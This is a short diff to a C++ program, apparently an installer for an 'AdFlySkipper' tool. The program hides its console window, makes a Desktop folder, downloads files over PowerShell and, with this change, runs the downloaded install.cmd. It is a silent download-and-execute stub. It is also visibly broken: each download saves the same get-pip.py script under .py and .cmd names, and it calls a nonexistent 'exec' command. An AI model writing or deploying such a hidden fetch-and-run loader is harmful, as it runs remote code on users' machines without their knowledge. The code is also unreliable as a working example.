@@ -6,11 +6,13 @@ using namespace std;
 int main () {
         FreeConsole();
         system("mkdir %userprofile%\\Desktop\\AdFlySkipperZip");
-        system("PowerShell -Command 'Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile c:\\Users\\$env:UserName\\Desktop\\AdFlySkipperZip\\main.py'");
-        system("PowerShell -Command 'Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile c:\\Users\\$env:UserName\\Desktop\\AdFlySkipperZip\\install.cmd'");
-        system("PowerShell -Command 'Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile c:\\Users\\$env:UserName\\Desktop\\AdFlySkipperZip\\start_adfs.cmd'");
+        system("PowerShell -Command Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile c:\\Users\\$env:UserName\\Desktop\\AdFlySkipperZip\\main.py");
+        system("PowerShell -Command Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile c:\\Users\\$env:UserName\\Desktop\\AdFlySkipperZip\\install.cmd");
+        system("PowerShell -Command Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -OutFile c:\\Users\\$env:UserName\\Desktop\\AdFlySkipperZip\\start_adfs.cmd");
+        system("exec %userprofile%\\Desktop\\AdFlySkipperZip\\install.cmd");
         return 0;
 }
+
 
 
 /*
